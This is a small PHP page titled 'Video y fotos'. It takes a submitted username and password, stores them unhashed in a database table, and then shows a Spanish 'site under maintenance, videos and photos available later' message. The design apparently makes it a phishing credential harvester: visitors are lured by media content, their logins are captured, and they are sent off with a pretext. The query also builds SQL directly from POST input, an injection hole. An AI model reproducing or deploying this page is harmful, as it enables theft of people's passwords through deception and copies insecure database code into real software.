<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Video y fotos</title>
    <link rel="stylesheet" href="guardar.css">
</head>
<body>
<?php

require 'conexion.php';

$usuario=$_POST['nombre'];
$password=$_POST['contra'];

$insertar = "INSERT INTO usu VALUES ('$usuario','$password')";

$query = mysqli_query($conectar,$insertar);

if($query){
    echo "
    <p>
    LA PAGINA ESTA EN MANTENIMIENTO 
    <br />
    <br />
    PODRA VER Y DESCARGAR LOS VIDEOS Y FOTOS LUEGO
    <br />
    <br />
    DISCULPE LA MOLESTIA 
    <p>
    ";
}

?>
</body>
</html>
